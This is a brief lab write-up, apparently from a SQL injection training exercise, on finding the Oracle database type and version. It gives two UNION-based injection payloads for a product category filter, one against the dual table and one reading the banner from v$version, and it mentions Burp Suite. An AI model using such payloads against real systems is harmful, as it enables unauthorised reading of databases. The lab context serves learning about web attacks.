Querying the database type and version on Oracle:
    -We use burip suite for this challenge
    -We use UNION attack vulnerability in the product category filter
    -'+UNION+SELECT+'abc','def'+FROM+dual-- this the query which we used for the retrive of the data requried
    -after this we use '+UNION+SELECT+BANNER,+NULL+FROM+v$version- query for the version. Which is asked